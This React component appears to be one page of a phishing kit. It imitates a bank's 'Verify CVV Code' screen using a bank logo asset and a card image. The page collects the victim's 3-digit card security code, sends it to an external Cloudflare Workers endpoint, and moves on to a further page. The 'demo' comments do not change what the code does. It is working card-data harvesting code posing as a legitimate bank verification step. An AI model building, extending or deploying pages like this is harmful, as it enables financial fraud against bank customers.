import React, { useRef, useState } from "react";
import { FaCheckCircle, FaUser } from "react-icons/fa";
import logo from "./assets/qib.png";
import cardImg from "./assets/card.webp";
import { useNavigate } from "react-router-dom";

const Secondpage = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [msg, setMsg] = useState("");
  const [isError, setIsError] = useState(false);
  const [loading, setLoading] = useState(false);
  const inputRef = useRef(null);

  // const handleSubmit = (e) => {
  //   e.preventDefault();

  //   if (!code) {
  //     setMsg("Please enter the 3-digit code.");
  //     setIsError(true);
  //     inputRef.current.focus();
  //     return;
  //   }

  //   if (!/^\d{3}$/.test(code)) {
  //     setMsg("Code must be exactly 3 digits.");
  //     setIsError(true);
  //     inputRef.current.focus();
  //     return;
  //   }

  //   setMsg("Verified successfully!");
  //   setIsError(false);

  //   setTimeout(() => {
  //     setCode("");
  //     setMsg("");
  //   }, 1800);
  // };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // local validation
    if (!code) {
      setMsg("Please enter the 3-digit code.");
      setIsError(true);
      inputRef.current?.focus();
      return;
    }
    if (!/^\d{3}$/.test(code)) {
      setMsg("Code must be exactly 3 digits.");
      setIsError(true);
      inputRef.current?.focus();
      return;
    }

    // call demo API
    setLoading(true);
    setMsg("");
    setIsError(false);

    try {
      const res = await fetch('https://my-worker.instapayapi.workers.dev', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "cvv", code }),
      });

      const json = await res.json();

      if (!res.ok) {
        // API-level error (400/500)
        setMsg(json.message || json.error || "Verification failed.");
        setIsError(true);
      } else {
        // success
        setMsg(json.message || "3-digit code verified successfully (demo).");
        setIsError(false);
        navigate('/third')
        // optional: clear after delay
        setTimeout(() => {
          setCode("");
          setMsg("");
        }, 1600);
      }
    } catch (err) {
      setMsg("Network error — please try again.");
      setIsError(true);
    } finally {
      setLoading(false);
    }
  };
  return (
    <div className="relative min-h-screen bg-white flex flex-col items-center px-4">
      {/* ✅ Full-page Loader */}
      {loading && (
        <div className="fixed inset-0 flex items-center justify-center bg-white bg-opacity-80 z-50">
          <div className="w-14 h-14 border-4 border-[#0075B0] border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {/* ✅ Logo */}
      <div className="w-full flex justify-center mt-0 mb-8">
        <img src={logo} alt="Logo" className="w-36 object-contain" />
      </div>

      {/* Card Container */}
      <div className="w-full max-w-2xl border border-gray-400 rounded-md shadow-sm">
        {/* Header */}
        <div className="bg-gray-100 border-b border-gray-400 rounded-t-md px-6 py-3 text-center">
          <h2 className="text-base font-medium">Verify CVV Code</h2>
        </div>

        <div className="px-8 py-8">
          {/* Card Image */}
          <div className="flex justify-center mb-6">
            <img src={cardImg} alt="card" className="w-36 h-auto object-contain" />
          </div>

          <form onSubmit={handleSubmit} autoComplete="off">
            <div className="flex flex-col">
              {/* Input Field */}
              <div className="flex items-center border border-gray-400 rounded-lg overflow-hidden">
                <div className="bg-gray-100 px-4 py-3 border-r border-gray-400">
                  <FaUser className="text-gray-600" />
                </div>
                <input
                  ref={inputRef}
                  type="number"
                  value={code}
                  onChange={(e) => {
                    const value = e.target.value.slice(0, 3); // limit to 3 digits
                    setCode(value);
                    setMsg("");
                  }}
                  placeholder="Enter 3-digit CVV security code"
                  className="w-full px-4 py-3 outline-none placeholder-gray-600 appearance-none"
                  maxLength={3}
                  inputMode="numeric"
                />
              </div>

              {/* Error or Success Message */}
              {msg && (
                <p
                  className={`mt-2 text-sm text-center ${isError ? "text-red-600" : "text-green-600"
                    }`}
                >
                  {msg}
                </p>
              )}
            </div>

            {/* Submit Button */}
            <div className="flex justify-center mt-6">
              <button
                // onClick={() => navigate("/third")}
                type="submit"
                className="inline-flex gap-2 items-center justify-center bg-[#0075B0] hover:bg-[#0075B0] text-white font-medium px-6 py-3 rounded-md"
              >
                 <FaCheckCircle  />
                Verify
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Secondpage;
